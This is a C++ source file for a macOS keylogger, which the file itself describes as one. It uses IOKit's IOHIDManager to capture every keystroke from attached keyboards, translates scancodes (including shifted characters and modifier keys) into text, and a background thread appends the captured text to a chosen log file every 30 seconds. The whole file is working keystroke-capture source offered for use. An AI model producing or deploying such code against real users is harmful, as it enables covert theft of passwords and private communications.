//
//  main.cpp
//  HIDMan_Test
// Keylogger that uses IOKit and the IOHIDManager to listen for key events
//
//  Copyright © 2018 kellogs. All rights reserved.
// Taken from here: https://stackoverflow.com/questions/30380400/how-to-tap-hook-keyboard-events-in-osx-and-record-which-keyboard-fires-each-even

#include <iostream>
#include <thread>
#include <map>
#include <IOKit/hid/IOHIDValue.h>
#include <IOKit/hid/IOHIDManager.h>
#include <sstream>
#include <vector>
#include <iostream>

std::map<uint32_t, std::string> keyMap;
std::map<uint32_t, std::string> shiftMap;
std::stringstream out("");
FILE *pFile;
char* path;
bool shiftPressed = false;

// Taken from : https://stackoverflow.com/questions/865668/how-to-parse-command-line-arguments-in-c
class InputParser{
public:
    InputParser (int &argc, char **argv){
        for (int i=1; i < argc; ++i)
            this->tokens.push_back(std::string(argv[i]));
    }
    /// @author iain
    const std::string& getCmdOption(const std::string &option) const{
        std::vector<std::string>::const_iterator itr;
        itr =  std::find(this->tokens.begin(), this->tokens.end(), option);
        if (itr != this->tokens.end() && ++itr != this->tokens.end()){
            return *itr;
        }
        static const std::string empty_string("");
        return empty_string;
    }
    /// @author iain
    bool cmdOptionExists(const std::string &option) const{
        return std::find(this->tokens.begin(), this->tokens.end(), option)
        != this->tokens.end();
    }
private:
    std::vector <std::string> tokens;
};

void printHelp() {
    std::cout <<"HIDman " << std::endl;
    std::cout <<"Usage: " << std::endl;
    std::cout <<"HIDman -o </path/to/output.log>" <<std::endl;
}



void initMaps() {
    keyMap.insert({4, "a"});
    keyMap.insert({5, "b"});
    keyMap.insert({6, "c"});
    keyMap.insert({7, "d"});
    keyMap.insert({8, "e"});
    keyMap.insert({9, "f"});
    keyMap.insert({10, "g"});
    keyMap.insert({11, "h"});
    keyMap.insert({12, "i"});
    keyMap.insert({13, "j"});
    keyMap.insert({14, "k"});
    keyMap.insert({15, "l"});
    keyMap.insert({16, "m"});
    keyMap.insert({17, "n"});
    keyMap.insert({18, "o"});
    keyMap.insert({19, "p"});
    keyMap.insert({20, "q"});
    keyMap.insert({21, "r"});
    keyMap.insert({22, "s"});
    keyMap.insert({23, "t"});
    keyMap.insert({24, "u"});
    keyMap.insert({25, "v"});
    keyMap.insert({26, "w"});
    keyMap.insert({27, "x"});
    keyMap.insert({28, "y"});
    keyMap.insert({29, "z"});
    keyMap.insert({30, "1"});
    keyMap.insert({31, "2"});
    keyMap.insert({32, "3"});
    keyMap.insert({33, "4"});
    keyMap.insert({34, "5"});
    keyMap.insert({35, "6"});
    keyMap.insert({36, "7"});
    keyMap.insert({37, "8"});
    keyMap.insert({38, "9"});
    keyMap.insert({39, "0"});
    keyMap.insert({44, " "});
    keyMap.insert({45, "-"});
    keyMap.insert({46, "="});
    keyMap.insert({47, "["});
    keyMap.insert({48, "]"});
    keyMap.insert({49, "\\"});
    keyMap.insert({51, ";"});
    keyMap.insert({52, "'"});
    keyMap.insert({53, "`"});
    keyMap.insert({54, ","});
    keyMap.insert({55, "."});
    keyMap.insert({56, "/"});
    keyMap.insert({42, "[BACKSPACE]"});
    keyMap.insert({43, "[TAB]"});
    keyMap.insert({57, "[CAPSLCK]"});
    keyMap.insert({224, "[LCNTRL]"});
    keyMap.insert({226, "[LOPTION]"});
    keyMap.insert({227, "[LCMD]"});
    keyMap.insert({228, "[RCNTRL]"});
    keyMap.insert({231, "[RCMD]"});
    
    // shift keymap
    
    shiftMap.insert({4, "A"});
    shiftMap.insert({5, "B"});
    shiftMap.insert({6, "C"});
    shiftMap.insert({7, "D"});
    shiftMap.insert({8, "E"});
    shiftMap.insert({9, "F"});
    shiftMap.insert({10, "G"});
    shiftMap.insert({11, "H"});
    shiftMap.insert({12, "I"});
    shiftMap.insert({13, "J"});
    shiftMap.insert({14, "K"});
    shiftMap.insert({15, "L"});
    shiftMap.insert({16, "M"});
    shiftMap.insert({17, "N"});
    shiftMap.insert({18, "O"});
    shiftMap.insert({19, "P"});
    shiftMap.insert({20, "Q"});
    shiftMap.insert({21, "R"});
    shiftMap.insert({22, "S"});
    shiftMap.insert({23, "T"});
    shiftMap.insert({24, "U"});
    shiftMap.insert({25, "V"});
    shiftMap.insert({26, "W"});
    shiftMap.insert({27, "X"});
    shiftMap.insert({28, "Y"});
    shiftMap.insert({29, "Z"});
    shiftMap.insert({30, "!"});
    shiftMap.insert({31, "@"});
    shiftMap.insert({32, "#"});
    shiftMap.insert({33, "$"});
    shiftMap.insert({34, "%"});
    shiftMap.insert({35, "^"});
    shiftMap.insert({36, "&"});
    shiftMap.insert({37, "*"});
    shiftMap.insert({38, "("});
    shiftMap.insert({39, ")"});
    shiftMap.insert({44, " "});
    shiftMap.insert({45, "_"});
    shiftMap.insert({46, "+"});
    shiftMap.insert({47, "{"});
    shiftMap.insert({48, "}"});
    shiftMap.insert({49, "|"});
    shiftMap.insert({51, ":"});
    shiftMap.insert({52, "\""});
    shiftMap.insert({53, "~"});
    shiftMap.insert({54, "<"});
    shiftMap.insert({55, ">"});
    shiftMap.insert({56, "?"});
    shiftMap.insert({42, "[BACKSPACE]"});
    shiftMap.insert({43, "[TAB]"});
    shiftMap.insert({57, "[CAPSLCK]"});
    shiftMap.insert({224, "[LCNTRL]"});
    shiftMap.insert({226, "[LOPTION]"});
    shiftMap.insert({227, "[LCMD]"});
    shiftMap.insert({228, "[RCNTRL]"});
    shiftMap.insert({231, "[RCMD]"});
}

void myHIDKeyboardCallback(void *context, IOReturn result, void *sender, IOHIDValueRef value) {
    // Callback function responsible for writing keystrokes to the log file.
    //pFile = fopen(path, "a");
    IOHIDElementRef elem = IOHIDValueGetElement( value );
    if (IOHIDElementGetUsagePage(elem) != 0x07)
        return;
    
    uint32_t scancode = IOHIDElementGetUsage( elem );
    //printf("%d", scancode);
    if (scancode < 4 || scancode > 231)
        return;
    
    long pressed = IOHIDValueGetIntegerValue( value );
    
    if (pressed == 1) {
        if (scancode == 225 || scancode == 229) // LSHIFT or RSHIFT
            shiftPressed = true;
        if (shiftPressed) {
            auto k = shiftMap.find(scancode);
            if (k != shiftMap.end()) {
                out << k->second;
                //fprintf(pFile, "%s", k->second.c_str());
            }
        }
        else {
            auto k = keyMap.find(scancode);
            if (k != keyMap.end()) {
                out << k->second;
                //fprintf(pFile, "%s", k->second.c_str());
            }
        }
    }
    else {
        if (scancode == 225 || scancode == 229)
            shiftPressed = false;
    }
    
    //close(f);
    //fclose(pFile);
}

void writeBufferToFile(){
    // Background thread that writes keystrokes to a file
    
    while (true) {
        pFile = fopen(path, "a");
        if (out.str().size() != 0) {
            const char *outfile = out.str().c_str();
            out.str("");
            fprintf(pFile, "%s", outfile);
            
        }
        fclose(pFile);
        sleep(30);
    }
}

CFMutableDictionaryRef myCreateDeviceMatchingDictionary(UInt32 usagePage, UInt32 usage) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(
                                                            kCFAllocatorDefault, 0
                                                            , & kCFTypeDictionaryKeyCallBacks
                                                            , & kCFTypeDictionaryValueCallBacks );
    if ( ! dict )
        return NULL;
    
    CFNumberRef pageNumberRef = CFNumberCreate( kCFAllocatorDefault, kCFNumberIntType, & usagePage );
    if ( ! pageNumberRef ) {
        CFRelease( dict );
        return NULL;
    }
    
    CFDictionarySetValue( dict, CFSTR(kIOHIDDeviceUsagePageKey), pageNumberRef );
    CFRelease( pageNumberRef );
    
    CFNumberRef usageNumberRef = CFNumberCreate( kCFAllocatorDefault, kCFNumberIntType, & usage );
    
    if ( ! usageNumberRef ) {
        CFRelease( dict );
        return NULL;
    }
    
    CFDictionarySetValue( dict, CFSTR(kIOHIDDeviceUsageKey), usageNumberRef );
    CFRelease( usageNumberRef );
    
    return dict;
}

int main(int argc, char * argv[]) {
    
    // Get the argument for the output file. Start the keylogger.
    initMaps();
    InputParser input(argc, argv);
    if (input.cmdOptionExists("-h")) {
        printHelp();
        exit(0);
    }
    
    const std::string &logfile = input.getCmdOption("-o");
    path = new char[logfile.length() + 1];
    strcpy(path, logfile.c_str());
    
    
    IOHIDManagerRef hidManager = IOHIDManagerCreate( kCFAllocatorDefault, kIOHIDOptionsTypeNone );
    
    CFArrayRef matches;
    {
        CFMutableDictionaryRef keyboard = myCreateDeviceMatchingDictionary( 0x01, 6 );
        CFMutableDictionaryRef keypad   = myCreateDeviceMatchingDictionary( 0x01, 7 );
        
        CFMutableDictionaryRef matchesList[] = { keyboard, keypad };
        
        matches = CFArrayCreate( kCFAllocatorDefault, (const void **)matchesList, 2, NULL );
    }
    
    IOHIDManagerSetDeviceMatchingMultiple( hidManager, matches );
    
    IOHIDManagerRegisterInputValueCallback( hidManager, myHIDKeyboardCallback, NULL );
    
    IOHIDManagerScheduleWithRunLoop( hidManager, CFRunLoopGetMain(), kCFRunLoopDefaultMode );
    
    IOHIDManagerOpen( hidManager, kIOHIDOptionsTypeNone );
    std::thread tThread(writeBufferToFile);
    tThread.detach();
    CFRunLoopRun(); // spins
    return 0;
}
